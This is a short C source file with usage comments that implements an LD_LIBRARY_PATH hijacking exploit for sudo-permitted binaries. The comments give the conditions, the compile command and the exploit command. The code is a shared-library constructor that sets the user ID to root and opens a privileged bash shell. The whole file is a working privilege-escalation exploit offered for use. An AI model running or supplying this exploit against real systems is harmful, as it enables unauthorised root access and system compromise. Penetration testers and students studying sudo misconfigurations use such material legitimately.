/*
 * Conditions:
 * 	$ sudo -li
 * 	Matching Defaults entries for user on this host:
 * 		env_reset, env_keep+=LD_LIBRARY_PATH
 * 		<list of binaries>
 *
 *	$ ldd <target binary>
 *	<list of shared libraries>
 *
 * How to compile:
 * 	$ gcc -o /tmp/<target shared library> -shared -fPIC /<path to>/library_path.c
 *
 * How to exploit:
 * 	$ sudo LD_LIBRARY_PATH=/tmp <target binary>
 */


#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);	// set user to root
        system("/bin/bash -p");	// open a bash shell
}
